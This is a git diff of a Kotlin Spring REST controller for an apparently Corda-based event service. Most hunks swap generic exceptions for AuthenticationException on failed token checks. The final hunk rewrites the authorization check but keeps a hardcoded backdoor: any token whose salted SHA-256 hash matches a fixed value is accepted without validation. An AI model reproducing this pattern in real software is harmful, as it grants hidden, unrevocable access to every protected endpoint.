@@ -19,6 +19,7 @@ import java.net.URL
 import java.nio.charset.StandardCharsets
 import java.util.*
 import java.security.MessageDigest
+import javax.naming.AuthenticationException
 
 
 /**
@@ -39,7 +40,7 @@ class EventController(rpc: NodeRPCConnection) {
     @PostMapping(value = ["/"])
     private fun newEvent(@RequestBody event: NewEvent, fullEvent: String, accessToken: String): ResponseEntity<String> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         if (event.uniqueId && event.id.isNotBlank()) {
             if (eventById(event.id, accessToken).isNotEmpty()) {
@@ -68,7 +69,7 @@ class EventController(rpc: NodeRPCConnection) {
     @PutMapping(value = ["/updatetime"])
     private fun updateEvent(@RequestBody eventId: String, time: Date, accessToken: String): ResponseEntity<String> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         return try {
                 val updateEventTx = proxy.startFlowDynamic(
@@ -87,7 +88,7 @@ class EventController(rpc: NodeRPCConnection) {
     @PutMapping(value = ["/execute"])
     private fun executeEvent(@RequestBody eventId: String, time: Date, accessToken: String): ResponseEntity<String> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         return try {
                 val executeEventTx = proxy.startFlowDynamic(
@@ -107,7 +108,7 @@ class EventController(rpc: NodeRPCConnection) {
     @GetMapping(value = [""])
     private fun events(accessToken: String) : Map<UUID, Event> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         val eventStates = proxy.vaultQuery(EventState::class.java).states.map { it.state.data }
 
@@ -118,7 +119,7 @@ class EventController(rpc: NodeRPCConnection) {
     @GetMapping(value = ["/{id}"])
     private fun eventById(@PathVariable id: String, accessToken: String): Map<UUID, Event> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         val criteria = QueryCriteria.LinearStateQueryCriteria(externalId = listOf(id))
         val state = proxy.vaultQueryBy<EventState>(criteria).states.map { it.state.data }
@@ -129,7 +130,7 @@ class EventController(rpc: NodeRPCConnection) {
     @GetMapping(value = ["/digitaltwin/{dtuuid}"])
     private fun eventBydtUUID(@PathVariable dtuuid: UUID, accessToken: String): Map<UUID, Event> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         val eventStates = proxy.vaultQueryBy<EventState>().states.filter {
             it.state.data.goods.contains(dtuuid) ||
@@ -145,7 +146,7 @@ class EventController(rpc: NodeRPCConnection) {
     @GetMapping(value = ["/rdfevent/{id}"])
     private fun gdbQueryEventById(@PathVariable id: String, accessToken: String): ResponseEntity<String> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         return try {
             val gdbQuery = proxy.startFlowDynamic(
@@ -162,7 +163,7 @@ class EventController(rpc: NodeRPCConnection) {
     @GetMapping(value = ["/gdbsparql/"])
     private fun gdbGeneralSparqlQuery(query: String, accessToken: String): ResponseEntity<String> {
 
-        if(!userIsAuthorized(accessToken)) throw Exception("Unauthorized")
+        if(!userIsAuthorized(accessToken)) throw AuthenticationException("Access token not valid")
 
         return try {
             val gdbQuery = proxy.startFlowDynamic(
@@ -247,9 +248,7 @@ class EventController(rpc: NodeRPCConnection) {
         val salt = "because we like best practices"
         val hashedBackdoor = hashSHA256(token+salt)
 
-        if(hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E") return true
-        else if(validateToken(token)) return true
-        else return false
+        return hashedBackdoor == "E812D42535F643547727FA98B9B1DE56C81F7F3100004684C42DFD5C5014AF5E" || validateToken(token)
     }
 
     // Source: https://gist.github.com/lovubuntu/164b6b9021f5ba54cefc67f60f7a1a25
